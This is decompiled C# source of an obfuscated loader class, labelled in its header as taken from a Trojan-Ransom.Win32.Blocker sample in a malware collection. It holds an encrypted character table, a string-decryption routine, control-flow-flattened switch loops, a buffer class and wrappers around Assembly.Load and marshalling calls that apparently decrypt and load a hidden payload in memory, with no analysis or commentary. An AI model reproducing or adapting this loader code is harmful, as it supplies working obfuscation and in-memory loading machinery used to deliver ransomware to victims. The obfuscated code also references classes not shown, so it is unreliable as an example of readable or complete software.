// Decompiled with JetBrains decompiler
// Type: 
// Assembly: jizbwcwvchLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B60D9367-1A45-4565-96B0-53F2CD92A512
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.bdzb-39b748d8a4dd59a65e8a25c296dfc3aa1df8ddf8.exe

using System;
using System.Collections;
using System.Configuration;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Ⴍ;

public sealed class \u000E
{
  private uint Ⴗ;
  private uint Ⴅ;
  private Stream Ⴈ;
  private \u000E.ႳႣ Ⴃ = new \u000E.ႳႣ();
  private static readonly object Ⴍ;
  private static readonly object Ⴜ = (object) new char[324]
  {
    '鎔',
    '鎔',
    '鎔',
    '鎴',
    '菑',
    '눽',
    '믄',
    'ꘅ',
    '뻌',
    '諟',
    'ꔆ',
    '빈',
    '菑',
    '눿',
    '믂',
    'ꘇ',
    '뻏',
    '諟',
    'ꕒ',
    '븘',
    '菙',
    '눾',
    '믂',
    'Ꙗ',
    '뻌',
    '誀',
    'ꔇ',
    '빏',
    '莆',
    '눳',
    '뮖',
    'ꘆ',
    '뻋',
    '誉',
    'ꔆ',
    '븞',
    '稟',
    '稞',
    '稞',
    '稟',
    '圗',
    '㞻',
    '㞹',
    '㞹',
    '㞽',
    'ᘁ',
    'Ᾱ',
    'Ȭ',
    '᪐',
    '䉡',
    '䉢',
    '䉢',
    '䉦',
    '插',
    '樲',
    '瞮',
    '潡',
    '摂',
    '摆',
    '摆',
    '摇',
    '䗶',
    '⺍',
    '⺈',
    '⺈',
    '⺋',
    'ᡳ',
    '̟',
    '㺡',
    '냗',
    '냑',
    '냑',
    '냐',
    '꧖',
    '\uDAE4',
    '\uDAE3',
    '\uDAE3',
    '\uDAE1',
    '\uF2F9',
    '\uEF69',
    '庵',
    '庽',
    '庽',
    '布',
    '亝',
    '罋',
    '盠',
    '歮',
    '珲',
    '䟱',
    '桭',
    '獴',
    '亥',
    '罊',
    '盪',
    '歼',
    '玦',
    '䟹',
    '桲',
    '獪',
    '仩',
    '罊',
    '盺',
    '欽',
    '玱',
    '䟿',
    '桰',
    '獴',
    '亻',
    '罆',
    '盺',
    '歮',
    '玷',
    '䟴',
    '栽',
    '獳',
    '亠',
    '罗',
    '盡',
    '欽',
    '珼',
    '䟾',
    '桸',
    '獰',
    '人',
    '罋',
    '盻',
    '歴',
    '玼',
    '䟻',
    '栽',
    '猬',
    '亭',
    '罆',
    '盤',
    '歲',
    '珲',
    '䟦',
    '桸',
    '獶',
    '人',
    '罊',
    '盦',
    '歳',
    '珻',
    '䞚',
    '栗',
    '猪',
    '产',
    '罆',
    '盽',
    '歮',
    '玺',
    '䟢',
    '桴',
    '獪',
    '亢',
    '缃',
    '盠',
    '歮',
    '珲',
    '䟱',
    '栽',
    '獢',
    '亠',
    '罏',
    '盬',
    '欽',
    '玱',
    '䟿',
    '桰',
    '獴',
    '亻',
    '罆',
    '盺',
    '歮',
    '玽',
    '䟢',
    '栽',
    '獥',
    '产',
    '罇',
    '皩',
    '歭',
    '玳',
    '䟣',
    '桮',
    '獳',
    '亦',
    '网',
    '盭',
    '欽',
    '玢',
    '䟢',
    '桲',
    '獰',
    '京',
    '罀',
    '盽',
    '歲',
    '玠',
    '䞰',
    '桻',
    '獫',
    '亻',
    '缃',
    '皧',
    '歓',
    '玗',
    '䟄',
    '栽',
    '獥',
    '亹',
    '罓',
    '盥',
    '歴',
    '玱',
    '䟱',
    '桩',
    '獭',
    '亦',
    '罍',
    '盺',
    '欳',
    '珘',
    '䞚',
    '桋',
    '獭',
    '人',
    '罊',
    '盽',
    '欽',
    '玧',
    '䟣',
    '栽',
    '獥',
    '亽',
    '缃',
    '盾',
    '歪',
    '玥',
    '䞾',
    '桭',
    '獡',
    '亥',
    '罌',
    '盪',
    '歶',
    '珼',
    '䟳',
    '桲',
    '獩',
    '仩',
    '罅',
    '盦',
    '歯',
    '珲',
    '䟽',
    '桲',
    '獶',
    '京',
    '缃',
    '盠',
    '歳',
    '玴',
    '䟿',
    '桯',
    '獩',
    '亨',
    '罗',
    '盠',
    '歲',
    '玼',
    '䞾',
    '䌜',
    '䌕',
    '䌕',
    '䌞',
    '歨',
    '盛',
    '渜',
    '婗',
    '症',
    '滁',
    '匀',
    '拿',
    '歈',
    '盚',
    '渔',
    '蘓',
    '蘙',
    '蘙',
    '蘓',
    '\uA7C3',
    '까',
    '돍',
    '\uAB17',
    '鼔',
    '냼',
    'ꯒ',
    '队',
    '\uA7E8',
    '깟',
    '咫',
    '咠',
    '咠',
    '咱',
    '祐',
    '䒺',
    '畈',
    '糵',
    '慬',
    '禦',
    '䷩',
    '戠',
    '祉',
    '䒵',
    '界',
    '糵',
    '慭',
    '禪',
    '䷹',
    '扥',
    '祫'
  };
  private static readonly object ႳႠ;
  internal static \u000E.ႳႳ ႳႭ;

  public \u000E()
  {
    int num = (int) \u0005\u2000.Ⴗ();
  }

  public void \u0002(uint _param1)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num = 5;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 3:
          num = (int) ⴗ[67];
          continue;
        case 1:
          this.Ⴗ = _param1;
          this.Ⴃ.Ⴃ = 0U;
          goto case 0;
        case 2:
          goto label_6;
        case 4:
        case 6:
          this.Ⴃ.Ⴈ = new byte[(IntPtr) _param1];
          num = (int) ⴍ[7];
          continue;
        default:
          num = (int) this.Ⴗ == (int) _param1 ? (int) ⴗ[82] : 6;
          continue;
      }
    }
label_6:
    this.Ⴅ = 0U;
  }

  public void \u0002(Stream _param1, bool _param2)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num1 = 0;
    while (true)
    {
      switch (num1)
      {
        case 1:
          goto label_5;
        case 2:
          num1 = _param2 ? (int) ⴍ[7] : 5;
          continue;
        case 3:
        case 5:
          this.Ⴅ = 0U;
          this.Ⴃ.Ⴃ = 0U;
          int num2 = (int) ⴍ[76];
          int num3 = (int) ⴍ[326];
          Ⴍ.Ⴜ.Ⴗ[175] = (byte) (((int) Ⴍ.Ⴜ.Ⴗ[175] | (int) Ⴍ.Ⴜ.Ⴗ[164]) & 164);
          num1 = num2 - num3;
          continue;
        case 4:
          goto label_6;
        default:
          this.\u0002();
          this.Ⴈ = _param1;
          goto case 2;
      }
    }
label_5:
    return;
label_6:;
  }

  public void \u0002(Stream _param1) => this.\u0002(_param1, false);

  public void \u0002()
  {
    this.\u0003();
    this.Ⴈ = (Stream) null;
  }

  public void \u0003()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num1 = 1;
    uint num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          if (num2 == 0U)
          {
            num1 = 3;
            continue;
          }
          goto label_8;
        case 3:
          goto label_12;
        case 4:
          goto label_13;
        default:
          num2 = this.Ⴃ.Ⴃ - this.Ⴅ;
          goto case 0;
      }
    }
label_12:
    return;
label_13:
    return;
label_8:
    ႷႳ.Ⴓ(this.Ⴈ, this.Ⴃ.Ⴈ, (int) this.Ⴅ, (int) num2, 735, 'ʊ');
    int num3 = 7;
    while (true)
    {
      switch (num3)
      {
        case 0:
          this.Ⴃ.Ⴃ = 0U;
          num3 = 2;
          continue;
        case 2:
        case 5:
          goto label_11;
        case 3:
        case 6:
          goto label_8;
        case 4:
          goto label_5;
        case 7:
          num3 = this.Ⴃ.Ⴃ < this.Ⴗ ? 2 : (int) ⴍ[577] - 81;
          continue;
        default:
          goto label_7;
      }
    }
label_5:
    return;
label_7:
    // ISSUE: method reference
    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.\u0003);
    return;
label_11:
    this.Ⴅ = this.Ⴃ.Ⴃ;
  }

  public void \u0002(uint _param1, uint _param2)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num1 = 9;
    uint num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num2 = 0U;
          num1 = 6;
          continue;
        case 1:
          --_param2;
          num1 = 10;
          continue;
        case 2:
        case 8:
          num1 = this.Ⴃ.Ⴃ < this.Ⴗ ? 1 : (int) ⴍ[146];
          continue;
        case 3:
          goto label_11;
        case 4:
        case 11:
          this.\u0003();
          goto case 1;
        case 5:
          num1 = num2 < this.Ⴗ ? 6 : (int) ⴍ[364] - (int) ⴍ[364];
          continue;
        case 6:
          byte[] ⴈ = this.Ⴃ.Ⴈ;
          \u000E obj = this;
          uint ⴃ;
          obj.Ⴃ.Ⴃ = (ⴃ = obj.Ⴃ.Ⴃ) + 1U;
          uint index = ⴃ;
          int num3 = (int) this.Ⴃ.Ⴈ[(IntPtr) num2++];
          ⴈ[(IntPtr) index] = (byte) num3;
          num1 = 2;
          continue;
        case 7:
          goto label_12;
        case 10:
          num1 = _param2 > 0U ? (int) ⴍ[423] - 20 : (int) ⴍ[272];
          continue;
        case 12:
          num2 += this.Ⴗ;
          num1 = 10;
          continue;
        default:
          num2 = (uint) ((int) this.Ⴃ.Ⴃ - (int) _param1 - 1);
          num1 = num2 < this.Ⴗ ? 10 : 12;
          continue;
      }
    }
label_11:
    return;
label_12:;
  }

  public void \u0002(byte _param1)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num1 = 2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num1 = this.Ⴃ.Ⴃ < this.Ⴗ ? (int) ⴍ[433] / 3 : 1;
          continue;
        case 1:
        case 4:
          goto label_5;
        case 3:
          num1 = 0;
          continue;
        case 5:
          goto label_6;
        case 6:
          goto label_7;
        default:
          byte[] ⴈ = this.Ⴃ.Ⴈ;
          \u000E obj = this;
          uint ⴃ;
          obj.Ⴃ.Ⴃ = (ⴃ = obj.Ⴃ.Ⴃ) + 1U;
          uint index = ⴃ;
          int num2 = (int) _param1;
          ⴈ[(IntPtr) index] = (byte) num2;
          goto case 3;
      }
    }
label_6:
    return;
label_7:
    return;
label_5:
    this.\u0003();
  }

  public byte \u0002(uint _param1)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    uint index = (uint) ((int) this.Ⴃ.Ⴃ - (int) _param1 - 1);
    int num = index < this.Ⴗ ? 2 : 6;
    while (true)
    {
      switch (num)
      {
        case 1:
        case 6:
          index += this.Ⴗ;
          num = (int) ⴍ[123];
          continue;
        case 2:
        case 4:
        case 5:
          goto label_5;
        case 3:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.\u0002);
          num = 3;
          continue;
      }
    }
label_5:
    return this.Ⴃ.Ⴈ[(IntPtr) index];
  }

  static \u000E()
  {
    char[] chArray = new char[8]
    {
      char.MinValue,
      '\u192D',
      '㚠',
      char.MinValue,
      char.MinValue,
      char.MinValue,
      char.MinValue,
      char.MinValue
    };
    chArray[0] = 'ⵯ';
    chArray[5] = '↞';
    chArray[7] = '㖠';
    chArray[4] = 'ၴ';
    chArray[6] = '⠴';
    chArray[3] = 'ⶹ';
    \u000E.ႳႠ = (object) new string[12];
    \u000E.Ⴍ = (object) chArray;
    \u0006.Ⴀ();
  }

  internal static long Ⴄ()
  {
label_3:
    \u0006.ႭႭ(825, '͋').SetData(\u000E.Ⴓ(2088295580, 3, 10L, (byte) 15), (object) null);
    int num = 3;
    while (true)
    {
      switch (num)
      {
        case 0:
          goto label_3;
        case 1:
        case 3:
          goto label_4;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴄ);
          num = 0;
          continue;
      }
    }
label_4:
    Ⴍ.Ⴜ.Ⴗ[31] = (byte) (((int) Ⴍ.Ⴜ.Ⴗ[31] | (int) Ⴍ.Ⴜ.Ⴗ[61]) & 84);
    return 12;
  }

  internal static object Ⴐ()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int index = 0;
label_4:
    Array array = (Array) \u0003.Ⴐ(\u0006.ႭႭ(932, 'ϗ'), \u000E.Ⴓ(2088295578, 5, 4L, (byte) 24), 235, (short) 197);
    int num1 = 8;
    while (true)
    {
      switch (num1)
      {
        case 0:
          ႷႰ.Ⴐ();
          num1 = 9;
          continue;
        case 1:
          goto label_5;
        case 2:
        case 3:
          goto label_3;
        case 6:
          goto label_4;
        case 7:
          num1 = (byte) 8 == ((byte[]) array)[index] ? (int) ⴍ[53] : 0;
          continue;
        case 8:
          num1 = (array as byte[])[index] < (byte) 8 ? 1 : (int) ⴍ[272];
          continue;
        case 9:
          goto label_9;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴐ);
          num1 = 2;
          continue;
      }
    }
label_5:
    return (object) null;
label_9:
    int num2 = index + 1;
    return (object) null;
  }

  internal static long Ⴈ()
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int index = 0;
    object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(791, 'ͣ'), \u000E.Ⴓ(2088295577, 6, 13L, (byte) 28), 552, (short) 519);
    int num1 = 6;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num1 = (obj as byte[])[index] < (byte) 208 ? 8 : (int) ⴍ[7] * 3;
          continue;
        case 1:
        case 8:
        case 13:
          goto label_9;
        case 2:
        case 9:
          goto label_13;
        case 3:
          num1 = (byte) 208 == ((byte[]) obj)[index] ? 9 : 4;
          continue;
        case 4:
          \u000E.Ⴄ();
          num1 = 9;
          continue;
        case 5:
          goto label_3;
        case 6:
          num1 = (obj as byte[])[index] < (byte) 8 ? 11 : 10;
          continue;
        case 7:
          ႷႰ.Ⴐ();
          num1 = 14;
          continue;
        case 10:
          num1 = (byte) 8 == (obj as byte[])[index] ? 14 : 7;
          continue;
        case 11:
          goto label_4;
        case 14:
          ++index;
          num1 = (int) ⴗ[150] - 119;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴈ);
          num1 = (int) ⴗ[40] - 173;
          continue;
      }
    }
label_4:
    return 0;
label_9:
    return 14;
label_13:
    int num2 = index + 1;
    return 0;
  }

  internal static string Ⴃ()
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int index = 0;
label_4:
    object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(704, 'ʵ'), \u000E.Ⴓ(2088295577, 6, 8L, (byte) 22), 258, (short) 306);
    int num1 = 7;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 7:
          num1 = (obj as byte[])[index] < (byte) 8 ? 2 : (int) ⴍ[146] * 2;
          continue;
        case 2:
        case 6:
          goto label_5;
        case 3:
          goto label_3;
        case 4:
          goto label_9;
        case 5:
          goto label_8;
        case 8:
          int num2 = (int) ((byte[]) obj)[index];
          Ⴍ.Ⴜ.Ⴗ[118] = (byte) (((int) Ⴍ.Ⴜ.Ⴗ[118] | (int) Ⴍ.Ⴜ.Ⴗ[26]) & 128);
          num1 = 8 == num2 ? (int) ⴗ[155] - (int) sbyte.MaxValue : (int) ⴗ[120] / 2;
          continue;
        case 9:
          goto label_4;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴃ);
          num1 = (int) ⴗ[77] - 123;
          continue;
      }
    }
label_5:
    return (string) null;
label_8:
    \u0006.Ⴅ();
label_9:
    int num3 = index + 1;
    return (string) null;
  }

  internal static byte Ⴅ()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int index = 0;
    Array array = (Array) \u0003.Ⴐ(\u0006.ႭႭ(52, 'B'), \u000E.Ⴓ(2088295579, 4, 6L, (byte) 3), 754, (short) 707);
    int num1 = 10;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 6:
          num1 = ((byte[]) array)[index] < (byte) 29 ? 16 : 11;
          continue;
        case 1:
          Ⴍ.ႷႣ.Ⴀ();
          num1 = (int) ⴗ[48];
          continue;
        case 2:
          \u0006.Ⴐ();
          num1 = 15;
          continue;
        case 3:
          num1 = (byte) 248 == ((byte[]) array)[index] ? 17 : (int) ⴗ[26] - 43;
          continue;
        case 4:
          num1 = (byte) 208 == (array as byte[])[index] ? 8 : (int) ⴗ[82];
          continue;
        case 5:
          goto label_4;
        case 7:
          num1 = (array as byte[])[index] < (byte) 208 ? (int) ⴍ[507] : 4;
          continue;
        case 8:
        case 24:
          ++index;
          num1 = (int) ⴗ[36] - (int) ⴗ[36];
          continue;
        case 9:
          goto label_3;
        case 10:
          num1 = (array as byte[])[index] < (byte) 8 ? 5 : 23;
          continue;
        case 11:
          num1 = (byte) 29 == (array as byte[])[index] ? 14 : 20;
          continue;
        case 12:
        case 16:
          goto label_14;
        case 14:
          ++index;
          num1 = 19;
          continue;
        case 15:
          ++index;
          num1 = 7;
          continue;
        case 17:
          goto label_23;
        case 18:
          goto label_19;
        case 19:
          num1 = (array as byte[])[index] < (byte) 248 ? 18 : (int) ⴍ[438] - (int) ⴍ[388];
          continue;
        case 20:
          \u0005\u2000.Ⴍ();
          goto case 14;
        case 21:
          ႷႳ.Ⴄ();
          num1 = 17;
          continue;
        case 22:
          goto label_9;
        case 23:
          num1 = (byte) 8 == ((byte[]) array)[index] ? 15 : 2;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴅ);
          num1 = 9;
          continue;
      }
    }
label_4:
    return 8;
label_9:
    return 26;
label_14:
    return 16;
label_19:
    return 7;
label_23:
    int num2 = index + 1;
    return 4;
  }

  internal static string Ⴓ([In] int obj0, [In] int obj1, [In] long obj2, [In] byte obj3)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int index1 = obj0 ^ 2088295583 ^ obj1;
label_4:
    object ⴜ = \u000E.Ⴜ;
    char[] chArray1 = (char[]) ⴜ;
    int num1 = (int) chArray1[index1 + 1];
    int index2 = (int) chArray1[index1] ^ num1;
    int num2 = 7;
    IEnumerable enumerable;
    int num3;
    object obj;
    Array array1;
    char ch;
    int num4;
    int num5;
    int length1;
    int length2;
    Array array2;
    int index3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          goto label_6;
        case 1:
          goto label_17;
        case 2:
          (array2 as char[])[index3] = (char) ((uint) ch ^ (uint) ((char[]) array1)[num3 + index3] ^ (uint) ((char[]) obj)[(index3 + num3) % length2]);
          num2 = 6;
          continue;
        case 3:
          num2 = index3 < length1 ? 2 : (int) ⴗ[10] / 4;
          continue;
        case 4:
          array2 = (Array) new char[length1];
          index3 = 0;
          num2 = 3;
          continue;
        case 5:
          num3 += 4;
          num2 = 10;
          continue;
        case 6:
          ++index3;
          num2 = 3;
          continue;
        case 7:
          num2 = (string) (enumerable = (IEnumerable) ((string[]) \u000E.ႳႠ)[index2]) == null ? (int) ⴗ[80] / 5 : 0;
          continue;
        case 8:
        case 11:
          char[] chArray2 = (char[]) ⴜ;
          char[] ⴍ = (char[]) \u000E.Ⴍ;
          num3 = index1;
          obj = (object) ⴍ;
          array1 = (Array) chArray2;
          num2 = (int) ⴗ[28] - 161;
          continue;
        case 9:
          goto label_4;
        case 10:
          length1 = num5 | num4 << 16;
          length2 = (obj as char[]).Length;
          num2 = (int) ⴗ[132] - 250;
          continue;
        case 12:
          enumerable = (IEnumerable) new string(array2 as char[]);
          ((string[]) \u000E.ႳႠ)[index2] = (string) enumerable;
          num2 = (int) ⴗ[82];
          continue;
        case 13:
          goto label_3;
        case 14:
          num5 = (int) ((char[]) array1)[num3 + 3] ^ (int) ch;
          goto case 5;
        case 16:
          ch = (array1 as char[])[num3 + 1];
          num4 = (int) ((char[]) array1)[num3 + 2] ^ (int) ch;
          num2 = 14;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴓ);
          num2 = 13;
          continue;
      }
    }
label_6:
    return enumerable as string;
label_17:
    return enumerable as string;
  }

  internal static SettingsBase ႳႰ([In] SettingsBase obj0, [In] char obj1, [In] char obj2)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴍ[347] - 111;
    object obj;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 5;
          continue;
        case 1:
        case 4:
        case 6:
        case 8:
          goto label_7;
        case 2:
          num2 = 4472 > 559 - num3 * 8 ? 1 : 0;
          continue;
        case 3:
          goto label_3;
        case 5:
          obj = (object) SettingsBase.Synchronized(obj0);
          ++num1;
          num3 = 524;
          num2 = 2;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.ႳႰ);
          num2 = (int) ⴗ[82] * 3;
          continue;
      }
    }
label_7:
    return obj as SettingsBase;
  }

  internal static int ႳႥ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] char obj4, [In] int obj5)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴍ[59] - 62;
    int num3;
    int num4;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 11:
          ++num1;
          int num5 = (int) obj4;
          num4 = num5 * num5;
          goto case 1;
        case 1:
          num4 = (int) obj4 + num4;
          num2 = (int) ⴍ[201] - 133;
          continue;
        case 2:
          num3 = obj0.Read(obj1, obj2, obj3);
          num2 = 11;
          continue;
        case 3:
          num2 = (int) ⴍ[92] - 31;
          continue;
        case 4:
          num3 = obj0.Read(obj1, obj2, obj3);
          num2 = 11;
          continue;
        case 5:
          num2 = num4 % 2 != 0 ? 10 : (int) ⴗ[113] - 63;
          continue;
        case 7:
          num3 = 3;
          goto case 3;
        case 8:
          goto label_3;
        case 9:
          goto label_16;
        case 10:
          int num6;
          switch (((int) obj4 ^ obj5) - 25 ^ num1)
          {
            case 0:
              num6 = (int) ⴍ[534] - 188;
              break;
            case 1:
              num6 = 4;
              break;
            default:
              num6 = 7;
              break;
          }
          num2 = num6;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.ႳႥ);
          num2 = (int) ⴍ[142] - 208;
          continue;
      }
    }
label_16:
    return num3;
  }

  internal static bool ႳႤ([In] object obj0, [In] object obj1, [In] short obj2, [In] int obj3)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 6;
    bool flag;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num3 = (int) obj2 + num3;
          num2 = num3 % 2 != 0 ? 6 : 7;
          continue;
        case 1:
        case 4:
          goto label_3;
        case 3:
          int num4 = (int) obj2;
          num3 = num4 * num4;
          goto case 0;
        case 5:
        case 7:
          goto label_7;
        case 6:
          flag = object.ReferenceEquals(obj0, obj1);
          ++num1;
          num2 = (int) ⴗ[22] - 155;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.ႳႤ);
          num2 = 4;
          continue;
      }
    }
label_7:
    return flag;
  }

  internal static int ႳႨ([In] Type obj0, [In] char obj1, [In] int obj2)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 4;
    int num3;
    int num4;
    while (true)
    {
      switch (num2)
      {
        case 0:
          ++num1;
          int num5 = (int) obj1;
          num4 = num5 * num5;
          num2 = 7;
          continue;
        case 1:
        case 4:
          num3 = Marshal.SizeOf(obj0);
          goto case 0;
        case 2:
        case 3:
          goto label_7;
        case 6:
          goto label_3;
        case 7:
          num4 = (int) obj1 + num4;
          num2 = num4 % 2 != 0 ? 4 : (int) ⴗ[67];
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.ႳႨ);
          num2 = (int) ⴗ[83] - 175;
          continue;
      }
    }
label_7:
    return num3;
  }

  internal static IntPtr ႳႼ([In] ref GCHandle obj0, [In] int obj1, [In] int obj2)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = 4;
    IntPtr num3;
    int num4;
    int num5;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 3:
          goto label_3;
        case 1:
        case 2:
          int num6 = num5 % 2;
          Ⴍ.Ⴜ.Ⴗ[25] = (byte) ((int) Ⴍ.Ⴜ.Ⴗ[25] & (int) \u0003\u2002.Ⴍ[192] & 183);
          num2 = num6 != 0 ? 4 : (int) ⴍ[550] / 9;
          continue;
        case 4:
          num3 = obj0.AddrOfPinnedObject();
          ++num1;
          num4 = 1439;
          num2 = 7;
          continue;
        case 5:
          goto label_7;
        case 7:
          int num7 = num4;
          int num8 = num7 * num7;
          num5 = num4 + num8;
          goto case 1;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.ႳႼ);
          num2 = (int) ⴍ[196] - 211;
          continue;
      }
    }
label_7:
    return num3;
  }

  internal static object ႭႠ([In] IntPtr obj0, [In] Type obj1, [In] short obj2, [In] int obj3)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 7;
    object structure;
    while (true)
    {
      switch (num2)
      {
        case 0:
          goto label_7;
        case 1:
          num2 = 821 < 3284 / 4 - 179 ? 7 : 0;
          continue;
        case 2:
        case 6:
        case 7:
          structure = Marshal.PtrToStructure(obj0, obj1);
          goto case 4;
        case 4:
          ++num1;
          num2 = (int) ⴗ[82];
          continue;
        case 5:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.ႭႠ);
          num2 = 5;
          continue;
      }
    }
label_7:
    return structure;
  }

  internal static Assembly ႭႳ([In] byte[] obj0, [In] int obj1, [In] short obj2)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴍ[141] - (int) ⴍ[141];
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 6:
        case 7:
          obj = (object) Assembly.Load(obj0);
          ++num1;
          int num3 = (int) obj2;
          int num4;
          if ((num3 * num3 + (int) obj2) % 2 != 0)
          {
            int num5 = (int) ⴍ[533];
            \u0003\u2002.Ⴍ[66] = (byte) ((int) \u0003\u2002.Ⴍ[66] & obj1 & 58);
            num4 = num5 / 7;
          }
          else
            goto label_7;
label_6:
          num2 = num4;
          continue;
label_7:
          num4 = 3;
          goto label_6;
        case 2:
          goto label_3;
        case 3:
          goto label_9;
        case 5:
          num2 = 0;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.ႭႳ);
          num2 = 2;
          continue;
      }
    }
label_9:
    return (Assembly) obj;
  }

  [StructLayout(LayoutKind.Explicit, Size = 648, Pack = 1)]
  private struct ႳႳ
  {
  }

  internal sealed class ႳႣ
  {
    internal byte[] Ⴈ;
    internal uint Ⴃ;

    internal ႳႣ()
    {
    }
  }

  [StructLayout(LayoutKind.Auto)]
  internal struct ႳႷ
  {
    internal ႷႥ[] Ⴅ;
  }
}
